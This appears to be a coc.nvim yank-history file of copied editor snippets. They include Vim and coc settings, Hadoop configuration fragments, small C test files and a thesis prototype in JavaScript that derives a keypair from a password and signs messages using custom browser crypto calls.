413611751552445e0bddb989e7dc7dbc|file:///home/neo/Documents/diplomatiki/create-keypair.js|4|5|V|javascript
	    encoder.encode
aa26670dc9a992177dca0678dcf7d253|list:/extensions|2|1|V|list
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
9dbcaf87f55cbf0901026e8badd25301|list:/extensions|9|1|V|list
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
d0fe61375a73366dcab38c35751eab47|list:/extensions|9|1|V|list
	Press ? on normal mode to get help.
12c779ee74f9464302f506d67d6dd73c|list:/extensions|11|1|V|list
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
00478008a1902fd208f0c51bc72a1c09|list:/extensions|4|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
70647d99e5aa76fc48b2f1df4d0330ea|list:/outline|2|1|V|list
	createKeyPairFromPassword	[Function]	2
	  encoder	[Variable]	3
	  passEnc	[Variable]	6
	  hashScrypt	[Variable]	7
	  hashArrayScrypt	[Variable]	8
	  privateKeyArray	[Variable]	11
	  privateKey	[Variable]	12
	    privateKeyArray.map() callback	[Function]	12
	  privateKeyEnc	[Variable]	14
	  hashSha512	[Variable]	16
	  hashArraySha512	[Variable]	17
	  hash512sliced	[Variable]	20
	  slicedText	[Variable]	21
	    hash512sliced.map() callback	[Function]	21
	  slicedEnc	[Variable]	23
	  publicKeyPromise	[Variable]	26
	  publicKeyByteArray	[Variable]	27
	  publicKey	[Variable]	29
	    publicKeyByteArray.map() callback	[Function]	29
	password	[Variable]	37
	keypair	[Variable]	39
	keypair.then() callback	[Function]	40
5ff72e3b6505f122d923e0ff24acb4ca|list:/outline|12|1|V|list
	password	[Variable]	37
	  passEnc	[Variable]	6
	  publicKey	[Variable]	29
	  privateKey	[Variable]	12
	  privateKeyEnc	[Variable]	14
	  privateKeyArray	[Variable]	11
	  publicKeyPromise	[Variable]	26
	  publicKeyByteArray	[Variable]	27
	    privateKeyArray.map() callback	[Function]	12
	    publicKeyByteArray.map() callback	[Function]	29
	createKeyPairFromPassword	[Function]	2
	keypair	[Variable]	39
	  hashScrypt	[Variable]	7
	  hashArrayScrypt	[Variable]	8
	keypair.then() callback	[Function]	40
	    hash512sliced.map() callback	[Function]	21
351244bee1eb51dbabedb62c4f899d9c|list:/outline|5|1|V|list
	  privateKey	[Variable]	12
	  privateKeyEnc	[Variable]	14
	  privateKeyArray	[Variable]	11
	    privateKeyArray.map() callback	[Function]	12
	  publicKeyPromise	[Variable]	26
	password	[Variable]	37
	  publicKeyByteArray	[Variable]	27
	createKeyPairFromPassword	[Function]	2
	    publicKeyByteArray.map() callback	[Function]	29
	keypair	[Variable]	39
	keypair.then() callback	[Function]	40
2962514964558e502be35ca0d0a8e1f0|list:/outline|5|1|V|list
	  privateKey	[Variable]	12
	  privateKeyEnc	[Variable]	14
	  privateKeyArray	[Variable]	11
	    privateKeyArray.map() callback	[Function]	12
80b7f0b63d53891cab20702d43a27b4b|file:///home/neo/.vimrc|55|1|V|vim
	" Syntastic settings
	set statusline+=%#warningmsg#
	set statusline+=%{SyntasticStatuslineFlag()}
	set statusline+=%*
	" let g:syntastic_mode_map = { 'mode': 'passive', 'active_filetypes': ["sh"],'passive_filetypes': ["c"] }
	nnoremap <C-w>e :SyntasticCheck<CR> :SyntasticToggleMode<CR>
	let g:syntastic_always_populate_loc_list = 1
	let g:syntastic_auto_loc_list = 1
	let g:syntastic_check_on_open = 0
	let g:syntastic_check_on_wq = 0
	let g:syntastic_enable_highlighting = 1
	
12cba3ee81cf4a793796a51b6327c678|file:///media/neo/Storage/mozilla-central/security/nss/lib/freebl/sha512.c|977|5|v|c
	copy
e51018f4387a40ec2c17ca8fafd8ebe7|file:///media/neo/Storage/mozilla-central/security/nss/lib/freebl/sha512.c|977|5|v|c
	copi
14ddcc38a51b053d77aaa1ef34d7b791|file:///home/neo/.config/coc/ultisnips/java.snippets|27|9|v|snippets
	Tab_trigger
ac60ed9ea80ded63f23ac392816e5ea5|file:///media/neo/Storage/mozilla-central/security/nss/lib/freebl/sha512.c|976|4|V|c
	    cry
2c25eaf20d09317d22d28c71b6a8512c|list:/extensions|2|1|V|list
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
b71a2ba25c1e71ad7af30393ac99a260|file:///home/neo/.vimrc|4|1|V|vim
	let g:oceanic_next_terminal_italic = 1
5a4370a60d649bc8ed18641ca76d9f54|file:///media/neo/Storage/mozilla-central/security/nss/lib/freebl/sha512.c|977|5|V|c
	    memcmp
7cc4db6681f4710e553f8c0b436f48b5|file:///media/neo/Storage/mozilla-central/security/nss/lib/freebl/sha512.c|977|10|V|c
	    memcma jp
	        hh
3e12173fc44b367911e29b56675db3a2|file:///home/neo/test.c|5|4|V|c
	   int a = a;
ecdbffbb3e3c6f3a314c108265cb8b5a|file:///home/neo/test.c|5|5|V|c
	    memcp  
d292f5308a51ab98ba4db90ca18c792a|file:///home/neo/test.c|6|4|V|c
	   m
6926f1f393126c4e59d2e25fe2d0ffc5|file:///home/neo/test.c|5|4|V|c
	    printf("Hello world!");
	    
6a320f91b9fbde4c9f6a2e5629618b66|file:///home/neo/test.c|6|5|V|c
	    mem
e64e6e24c2aba5e3258cb201ded118b7|file:///home/neo/test.c|3|1|V|c
	#include <ma
bd84460c3e0452ec1114497577d840ef|file:///home/neo/.vimrc|57|1|V|vim
	let g:ycm_key_list_select_completion = ['<Down>'] " Remove <Tab> from the list of keys mapped by YCM.
493341f6514708b7f7df39a87a3f443e|file:///home/neo/.vimrc|57|1|V|vim
	inoremap <expr> <Tab> pumvisible() ? "\<C-n>" : "·êÖ"
a6a7fed0d3fe5aa3223f565525169230|file:///home/neo/.vim/bundle/coc.nvim/.vim/coc-settings.json|7|1|V|jsonc
	
	"languageserver": {
	    "ccls": {
	      "command": "ccls",
	      "filetypes": ["c", "cpp", "objc", "objcpp"],
	      "rootPatterns": [".ccls", "compile_commands.json", ".vim/", ".git/", ".hg/"],
	      "initializationOptions": {
	         "cache": {
	           "directory": "/tmp/ccls"
	         }
	       }
	    }
	  }
10260491d517a7a02102edb4d4aebc01|file:///home/neo/.vim/bundle/coc.nvim/.vim/coc-settings.json|6|1|V|jsonc
	    "languageserver": { "ccls": {
	          "command": "ccls",
	          "filetypes": ["c", "cpp", "objc", "objcpp"],
	          "rootPatterns": [".ccls", "compile_commands.json", ".vim/", ".git/", ".hg/"],
	          "initializationOptions": {
	             "cache": {
	               "directory": "/tmp/ccls"
	             }
	           }
	        }
	      }
bf5b42205d9383159bb2ea1cf02f2b15|file:///home/neo/.zshrc|98|8|v|zsh
	HADOOP_PREFIX
089ddbff2bd86941bb8941a23bd54cd8|file:///usr/local/hadoop/etc/hadoop/yarn-env.sh|171|49|v|sh
	-SYSTEM"
017c8808ea21675ae9d14fd9ff7f8b3b|file:///usr/local/hadoop/etc/hadoop/yarn-site.xml|17|1|V|xml
	    <description>
	      Enable services rest api on ResourceManager.
	    </description>
573863aa4f923a8e1c5aeb2a44572dbe|file:///usr/local/hadoop/etc/hadoop/mapred-site.xml|23|1|V|xml
	p    <property>
	        <name>mapreduce.framework.name</name>
	        <value>yarn</value>
	    </property>
8297ececbed96228ce9365c638b76500|file:///usr/local/hadoop/etc/hadoop/yarn-site.xml|25|1|V|xml
	  </property>
	<!-- <property> -->
e9329f43d494fe03efe6ea95eda2df48|file:///usr/local/hadoop/etc/hadoop/yarn-site.xml|34|1|V|xml
	<!-- <property> -->
	<!-- <name>yarn.nodemanager.aux-services</name> -->
	<!-- <value>mapreduce_shuffle</value> -->
	<!-- </property> -->
c00968ed04a3918d81140e81283b37f2|file:///home/neo/.zshrc|112|1|V|zsh
	setxkbmap -option caps:swapescape
8dd6bef1d938ee3d28a0b489ef5d1c65|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|22|5|V|php
	    echo $array;
68ec97f1c5e8f031e54c3cea2b0ca135|file:///home/neo/test.c|11|1|V|c
	    printf
fca76911b49a066097a3c606eaf8a79c|list:/extensions|2|1|V|list
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
ec1a9fdbaf2d1d9afc5fa061ef1e8f38|list:/extensions|14|1|V|list
	* coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
f546903fa11d629070b9b625090aec89|list:/extensions|4|1|V|list
	* coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
5ccde94d94dea06a0ee34001df1fc6b0|list:/extensions|4|1|V|list
	* coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
c59fd79ecbe2ebaf16bb0c4fe1c6e9cc|list:/extensions|4|1|V|list
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
11855bcefb0979272a0c23505b2fb9b8|file:///home/neo/.vim/bundle/coc.nvim/.vim/coc-settings.json|18|1|V|jsonc
	  "languageserver": {
	    "clangd": {
	      "command": "clangd",
	      "args": ["--background-index"],
	      "rootPatterns": ["compile_flags.txt", "compile_commands.json", ".vim/", ".git/", ".hg/"],
	      "filetypes": ["c", "cpp", "objc", "objcpp"]
	    }
	  }
343cfcebb1d02a1f5668620231197333|file:///home/neo/.vim/bundle/coc.nvim/.vim/coc-settings.json|6|1|V|jsonc
	 "languageserver": {
	    "ccls": {
	      "command": "ccls",
	      "filetypes": ["c", "cpp", "objc", "objcpp"],
	      "rootPatterns": [".ccls", "compile_commands.json", ".vim/", ".git/", ".hg/"],
	      "initializationOptions": {
	         "cache": {
	           "directory": "/tmp/ccls"
	         }
	       }
	    }
	  }
9c2ef81a746c03e514b3376001d1e5d7|file:///home/neo/Documents/testdir/test.c|9|5|V|c
	    pu
00e34f12c6552c0a70899bf9044a960a|file:///home/neo/Documents/testdir/test.c|9|5|V|c
	    scanf
e6badff6b7f33ff88676c880fc4f82a4|file:///home/neo/Documents/testdir/test.c|8|5|V|c
	    abs
06634a6ea2d25e1239a95d19060a9e91|list:/extensions|4|1|V|list
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
aec3cfb9cecffe945b2a1ab591e1d2ff|list:/extensions|2|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
c2b462050fabee9aeed0e5442db4fdcb|list:/extensions|2|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
98ebc757a0a0b477d451ef9166d14957|list:/extensions|15|1|V|list
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
aa5f90d5adf6000bd8e47608f50985f3|list:/extensions|6|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
0cf31b2c283ce3431794586df7b0996d|file:///home/neo/Documents/diplomatiki/create-keypair.js|6|4|V|javascript
	    
2afd799eb653a1256eec54cb8a255508|file:///home/neo/Documents/diplomatiki/create-keypair.js|5|5|V|javascript
	    a
2717b86ca31369ec2a38deefcfc8c795|file:///home/neo/Documents/diplomatiki/create-keypair.js|5|5|V|javascript
	    texte
e186abf2995393c1e72c9e2cbf278344|file:///home/neo/Documents/diplomatiki/create-keypair.js|4|5|V|javascript
	    let a
9940ec9d6462a96f51f674c82c628866|file:///home/neo/Documents/diplomatiki/javascript-files/verify_sig/verify.py|5|1|V|python
	import sys
dad35e2bbd423a9c4e6304ec29238791|file:///home/neo/Documents/diplomatiki/javascript-files/verify_sig/verify.py|23|37|v|python
	publnc_key_str
172fa1b31a062a03d73d1ff1075e899c|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|35|5|V|javascript
	    let signature_ret;
5da3c67a8db40e4dcfa9c9b8d01fda15|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|43|1|V|javascript
	// let password = prompt("Type your password:");
	
	// let keypair = createKeyPairFromPassword(password);
	// keypair.then( () => {
	//     console.log("Keypair: ", keypair);
	// });
e23e58d45ffcf84d7ac5ac7cc04f128a|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|48|1|V|javascript
	
	function hexToBytes(hex) {
	    for (var bytes = [], c = 0; c < hex.length; c += 2)
		    bytes.push(parseInt(hex.substr(c, 2), 16));
	    return bytes;
	}
	
	async function createKeyPairFromPassword(password) {
	    const encoder = new TextEncoder();
	
	    //Get scrypt hash of password
	    const passEnc = encoder.encode(password);
	    const hashScrypt = await crypto.subtle.digest('SCRYPT', passEnc);
	    const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt));                     // convert buffer to byte array
	
	    //Slice scrypt hash to 32 bytes to get the privateKey
	    const privateKeyArray = hashArrayScrypt.slice(0, 32);
	    const privateKey = privateKeyArray.map(b => b.toString(16).padStart(2, '0')).join('');
	
	    const privateKeyEnc = hexToBytes(privateKey);
	    const privateKeyBytes = new Uint8Array(privateKeyEnc);
	    //Curve25519 scalar mult lower 32 bytes of sha512 hash to get public key
	    const publicKeyPromise = await crypto.subtle.digest('CURVE25519', privateKeyBytes);
	    const publicKeyByteArray = Array.from(new Uint8Array(publicKeyPromise));                     // convert buffer to byte array
	
	    const publicKey = publicKeyByteArray.map(b => b.toString(16).padStart(2, '0')).join('');
	
	    console.log("Private key: ", privateKey);
	    console.log("Public key: ", publicKey);
	
	    return privateKey.concat(publicKey);
	}
	
	async function signMessage(keypair, message){
	    const input = keypair.concat(message);
	    console.log("Signature input: ",input);
	    const inputBuf = hexToBytes(input);
	    const inputArray = new Uint8Array(inputBuf);
	    
	    return crypto.subtle.digest('ED25519SIGN', inputArray);
	}
	
bdaedfd1b626931183ddb0334e44f996|file:///home/neo/.vimrc|146|1|V|vim
	nmap <leader>ac  <Plug>(coc-codeaction)
4e37c8f56f6907ee9b977213077c1927|file:///home/neo/.vimrc|165|1|v|vim
	nmap <leader>a
13a5442a73cc9ec9cb18a2e41ed90128|file:///home/neo/.vimrc|165|1|V|vim
	c  <Plug>(coc-codeaction)
16c1235d4792649ef95111a817a93183|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|7|1|V|javascript
	async function createKeyPairFromPassword(password) {
7ab1dfd3cb7c3b20f5f418729c992207|file:///home/neo/.vimrc|157|1|V|vim
	nmap <silent> <TAB> <Plug>(coc-range-select)
f802669d45d65aa1e041e8d0716ce4dd|file:///home/neo/.vimrc|113|1|V|vim
	nnoremap <silent> K :call <SID>show_documentation()<CR>
11929f3682ae46922919fdc9721249e2|file:///home/neo/.vimrc|165|31|v|vim
	:call 
bfe0dc75ad7dfb799becd0304d278567|file:///home/neo/.vimrc|165|31|v|vim
	<SID>show_documentation(
af1a033868620666960bf917dbfc02d0|file:///home/neo/.vimrc|165|1|V|vim
	nnoremap <silent> <leader> fo :Fold<CR>
a8be6f5c87a8aa510a017a1dc22c8441|file:///home/neo/.vimrc|170|1|V|vim
	set statusline^=%{coc#status()}%{get(b:,'coc_current_function','')}
d82bb854d6399615b131d90ac577e824|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|19|1|V|javascript
	  const privateKey = privateKeyArray.map(b => b.toString(16).padStart(2, "0"))
bc17042e37fe8af7e27fd4b24623180d|file:///home/neo/.vimrc|192|1|V|vim
	nnoremap <silent> <space>y  :<C-u>CocList -A --normal yank<cr>
0c6dc058bbb64c9d98d53704736251fe|file:///home/neo/.vimrc|190|1|V|vim
	" COC key mappings
b5478eeee2e58b3573320f6ee877b1ed|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|7|1|V|javascript
	async function createKeyPairFromPassword(password) {
	  const encoder = new TextEncoder();
	
	  //Get scrypt hash of password
	  const passEnc = encoder.encode(password);
c27fa932cdf7dfc3807420bd18feccaf|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|7|1|V|javascript
	async function createKeyPairFromPassword(password) {
	  const encoder = new TextEncoder();
bbf00cb881e298782c18f61891a0f575|list:/extensions|2|1|V|list
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
087424e177d370a435d6e060f0322c60|file:///home/neo/.vimrc|193|1|V|vim
	
	 " trigger snippet expand.
8b9ede4da5680510d40bb46b655df490|file:///home/neo/Documents/diplomatiki/create-keypair.js|5|5|V|javascript
	    PerformanceObserver
16ecaec504d7244ca6c4db21704df9b8|list:/extensions|2|1|V|list
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	+ coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
849c1d081f40d646df7a62521f71ce34|file:///home/neo/.vimrc|194|1|V|vim
	 " trigger snippet expand.
	 imap <leader>r <Plug>(coc-snippets-expand)
	
	 " Use <C-j> for select text for visual placeholder of snippet.
	 vmap <C-j> <Plug>(coc-snippets-select)
	
	 " Use <C-j> for jump to next placeholder, it's default of coc.nvim
	 let g:coc_snippet_next = '<c-n>'
	
	 " Use <C-k> for jump to previous placeholder, it's default of coc.nvim
	 let g:coc_snippet_prev = '<c-p>'
	
	 " Use <C-j> for both expand and jump (make expand higher priority.)
	 imap <C-p> <Plug>(coc-snippets-expand-jump)
	
f55eea93a1ee2b75c335d231c05340ad|list:/grep|2|1|V|list
	create-keypair.js:2:1:async function createKeyPairFromPassword(password) {
	cryptotest.js:3:3:  async function digestMessageSha256(text) {
	cryptotest.js:12:3:  async function createKeysCurve25519(text) {
	cryptotest.js:21:3:  async function digestMessageScrypt(text) {
	curve25519-digest.js:3:3:  async function createKeysCurve25519(text) {
	javascript-files/create-keypair.js:7:1:async function createKeyPairFromPassword(password) {
	javascript-files/create-keypair.js:40:1:async function signMessage(keypair, message) {
	javascript-files/time-password.js:1:1:async function submitPassword(username, password){
	javascript-files/time-signature.js:1:1:async function createAndSign(username, password){
	keybase/sitewide-keybase.js:14:11637:[Omitted long line with 1 matches]
	keybase/sitewide-keybase.js:17:31897:[Omitted long line with 1 matches]
	keybase/sitewide-keybase.js:18:4052:[Omitted long line with 6 matches]
	keybase/sitewide-keybase.js:18:8362:[Omitted long line with 6 matches]
	keybase/sitewide-keybase.js:18:10592:[Omitted long line with 6 matches]
	keybase/sitewide-keybase.js:18:14335:[Omitted long line with 6 matches]
	keybase/sitewide-keybase.js:18:15372:[Omitted long line with 6 matches]
	keybase/sitewide-keybase.js:18:16320:[Omitted long line with 6 matches]
	javascript-files/testing/testsig.js:7:1:async function createKeyPairFromPassword() {
	javascript-files/testing/testsig.js:26:1:async function signMessage(keypair, message){
	javascript-files/testing/testkey.js:7:1:async function createKeyPairFromPassword() {
	keybase/triplesec.js:328:11:      var async_args, input, progress_hook, slice_args, what;
	keybase/triplesec.js:346:7:      async_args = {
	keybase/triplesec.js:351:52:      return util.bulk(input.sigBytes, slice_args, async_args);
304ddeec46aee82d1f15b14e0eb7458c|list:/extensions|15|1|V|list
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
f438ede21a0323268ac3f7af786177bc|list:/outline|5|1|V|list
	keypair.then() callback	[Function]	40
	keypair	[Variable]	39
	password	[Variable]	37
	    publicKeyByteArray.map() callback	[Function]	29
	  publicKey	[Variable]	29
	  publicKeyByteArray	[Variable]	27
	  publicKeyPromise	[Variable]	26
	  slicedEnc	[Variable]	23
	    hash512sliced.map() callback	[Function]	21
	  slicedText	[Variable]	21
	  hash512sliced	[Variable]	20
	  hashArraySha512	[Variable]	17
	  hashSha512	[Variable]	16
	  privateKeyEnc	[Variable]	14
	    privateKeyArray.map() callback	[Function]	12
